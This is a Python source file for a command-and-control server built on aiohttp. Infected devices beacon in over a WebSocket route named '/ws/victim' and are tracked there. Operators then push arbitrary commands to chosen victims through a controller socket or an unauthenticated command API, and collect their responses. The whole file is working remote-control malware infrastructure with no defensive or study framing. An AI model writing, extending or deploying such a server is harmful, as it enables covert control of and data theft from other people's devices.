
import asyncio
import json
import uuid
import os
from datetime import datetime
from pathlib import Path
from aiohttp import web
import aiohttp

devices     = {}
controllers = set()

async def broadcast(obj):
    msg = json.dumps(obj)
    dead = set()
    for ws in list(controllers):
        try:
            await ws.send_str(msg)
        except Exception:
            dead.add(ws)
    controllers.difference_update(dead)

async def ws_handler(request):
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    path = request.path
    if '/controller' in path:
        controllers.add(ws)
        snap = [{"id": did, "info": d["info"], "connected_at": d["connected_at"]}
                for did, d in devices.items()]
        await ws.send_str(json.dumps({"type": "snapshot", "devices": snap}))
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    if data.get("type") == "command":
                        target = devices.get(data.get("device_id"))
                        if target and not target["ws"].closed:
                            await target["ws"].send_str(json.dumps({
                                "type":    "command",
                                "command": data.get("command"),
                                "params":  data.get("params", {})
                            }))
                except Exception:
                    pass
            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                break
        controllers.discard(ws)
    else:
        device_id = None
        async for msg in ws:
            if msg.type == aiohttp.WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    if data.get("type") == "beacon":
                        device_id = data.get("device_id") or str(uuid.uuid4())
                        devices[device_id] = {
                            "ws": ws, "info": data.get("info", {}),
                            "data": {}, "connected_at": datetime.utcnow().isoformat()
                        }
                        await broadcast({"type": "device_online", "id": device_id, "info": data.get("info", {})})
                        print(f"[+] Device: {device_id}")
                    elif data.get("type") in ("response", "error"):
                        if device_id and device_id in devices:
                            devices[device_id]["data"][data.get("command","?")] = data.get("data") or data.get("error")
                        await broadcast({**data, "device_id": device_id})
                except Exception:
                    pass
            elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
                break
        if device_id and device_id in devices:
            del devices[device_id]
            await broadcast({"type": "device_offline", "id": device_id})
    return ws

async def api_devices(request):
    result = [{"id": did, "info": d["info"], "connected_at": d["connected_at"]} for did, d in devices.items()]
    return web.json_response(result)

async def api_command(request):
    body = await request.json()
    device = devices.get(body.get("device_id"))
    if not device:
        return web.json_response({"error": "device_not_found"}, status=404)
    await device["ws"].send_str(json.dumps({"type": "command", "command": body.get("command"), "params": body.get("params", {})}))
    return web.json_response({"status": "sent"})

async def index_handler(request):
    static_path = Path(__file__).parent / "public" / "index.html"
    if static_path.exists():
        return web.FileResponse(static_path)
    return web.Response(text="Panel not found", status=404)

def make_app():
    app = web.Application()
    app.router.add_get("/ws/victim",     ws_handler)
    app.router.add_get("/ws/controller", ws_handler)
    app.router.add_get("/api/devices",   api_devices)
    app.router.add_post("/api/command",  api_command)
    app.router.add_get("/",              index_handler)
    static_path = Path(__file__).parent / "public"
    if static_path.exists():
        app.router.add_static("/", static_path)
    return app

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"Starting C2 on port {port}")
    web.run_app(make_app(), host="0.0.0.0", port=port)
